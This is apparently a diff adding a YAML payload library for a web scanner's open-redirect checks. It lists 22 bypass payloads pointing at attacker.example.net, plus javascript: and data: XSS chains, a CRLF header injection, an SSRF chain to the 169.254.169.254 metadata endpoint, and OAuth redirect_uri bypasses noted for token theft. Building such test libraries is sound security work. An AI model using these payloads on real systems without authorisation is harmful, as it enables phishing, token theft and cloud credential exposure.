@@ -1,0 +1,225 @@
+id: open_redirect
+name: Open Redirect
+version: 1.0.0
+category: misconfiguration
+description: |
+  Payloads to detect server-issued open redirects (Location header redirection
+  to attacker-controlled URLs). Covers protocol bypasses, slash variants, IDN
+  homographs, userinfo confusion, double-encoding, and backslash variants.
+mitre:
+  - T1204.001
+owasp_top10:
+  - A01:2021
+references:
+  - https://owasp.org/www-community/attacks/Open_Redirect
+  - https://book.hacktricks.xyz/pentesting-web/open-redirect
+  - https://github.com/payloadbox/open-redirect-payload-list
+related_tools:
+  - nuclei
+  - openredirex
+  - dalfox
+chains:
+  - bug_bounty_full
+  - web_active
+payloads:
+  - id: basic_external
+    name: Basic external URL
+    subcategory: basic
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: https://attacker.example.net
+    notes: null
+    source: common knowledge
+  - id: protocol_relative
+    name: Protocol-relative URL
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: //attacker.example.net
+    notes: Browser uses current scheme
+    source: common knowledge
+  - id: triple_slash
+    name: Triple-slash bypass
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: ///attacker.example.net
+    notes: null
+    source: common knowledge
+  - id: backslash_slash
+    name: Backslash-slash bypass
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: \\attacker.example.net
+    notes: Some parsers normalise \ to /
+    source: common knowledge
+  - id: backslash_double
+    name: Backslash double bypass
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: \/\/attacker.example.net
+    notes: null
+    source: common knowledge
+  - id: userinfo_bypass
+    name: Userinfo @ bypass
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: https://target.example.net@attacker.example.net
+    notes: Attacker is real host; target is userinfo
+    source: https://book.hacktricks.xyz/pentesting-web/open-redirect
+  - id: userinfo_url_encoded
+    name: URL-encoded @ bypass
+    subcategory: filter_bypass
+    encoding: url
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: https://target.example.net%40attacker.example.net
+    notes: null
+    source: common knowledge
+  - id: dot_dotdot_trick
+    name: Dot trick
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: https://attacker.example.net.target.example.net
+    notes: For startsWith checks
+    source: common knowledge
+  - id: subdomain_lookalike
+    name: Subdomain lookalike
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: https://target.example.net.attacker.example.net
+    notes: For endsWith() validators
+    source: common knowledge
+  - id: punycode_idn
+    name: Punycode IDN
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: https://xn--trget-cqa.example.net
+    notes: Visually similar
+    source: common knowledge
+  - id: cr_lf_split
+    name: CRLF newline split
+    subcategory: filter_bypass
+    encoding: url
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: /redirect?next=https://target.example.net%0d%0aLocation:%20https://attacker.example.net
+    notes: When app sets Location from raw input
+    source: common knowledge
+  - id: tab_split
+    name: Tab/whitespace split
+    subcategory: filter_bypass
+    encoding: url
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: https://%09attacker.example.net
+    notes: null
+    source: common knowledge
+  - id: double_encoded_slash
+    name: Double-encoded slash
+    subcategory: filter_bypass
+    encoding: url
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: https:%252f%252fattacker.example.net
+    notes: null
+    source: common knowledge
+  - id: javascript_scheme
+    name: "javascript: scheme"
+    subcategory: xss_chain
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: javascript:alert(document.domain)
+    notes: When Location uses href attribute client-side
+    source: common knowledge
+  - id: data_url
+    name: "data: URI redirect"
+    subcategory: xss_chain
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: data:text/html,<script>alert(1)</script>
+    notes: null
+    source: common knowledge
+  - id: white_listed_path
+    name: Whitelisted path with hash
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: /path#https://attacker.example.net
+    notes: When relative path rewriting drops scheme prefix
+    source: common knowledge
+  - id: case_sensitive_scheme
+    name: Case-variant scheme
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: HtTpS://attacker.example.net
+    notes: For case-sensitive scheme blocklists
+    source: common knowledge
+  - id: fragment_bypass
+    name: Trailing fragment
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: https://attacker.example.net#target.example.net
+    notes: null
+    source: common knowledge
+  - id: utf8_dot
+    name: Fullwidth dot
+    subcategory: filter_bypass
+    encoding: unicode
+    tech_targets: [generic]
+    severity_when_works: low
+    payload: "https://attacker．example．net"
+    notes: U+FF0E sometimes normalised to ASCII dot
+    source: common knowledge
+  - id: ssrf_chain_oob
+    name: Open redirect -> SSRF chain
+    subcategory: chained
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      Trigger SSRF that fetches /redirect?to=http://169.254.169.254/latest/meta-data/
+    notes: Chain with SSRF endpoint that follows redirects
+    source: https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
+  - id: oauth_redirect_uri
+    name: OAuth redirect_uri bypass
+    subcategory: oauth
+    encoding: raw
+    tech_targets: [oauth]
+    severity_when_works: critical
+    payload: |
+      redirect_uri=https://target.example.net.attacker.example.net/cb
+    notes: Token theft via lax redirect_uri check
+    source: https://portswigger.net/research/hidden-oauth-attack-vectors
+  - id: oauth_path_traversal
+    name: OAuth redirect_uri path traversal
+    subcategory: oauth
+    encoding: raw
+    tech_targets: [oauth]
+    severity_when_works: high
+    payload: |
+      redirect_uri=https://target.example.net/cb/../../callback@attacker.example.net
+    notes: null
+    source: common knowledge
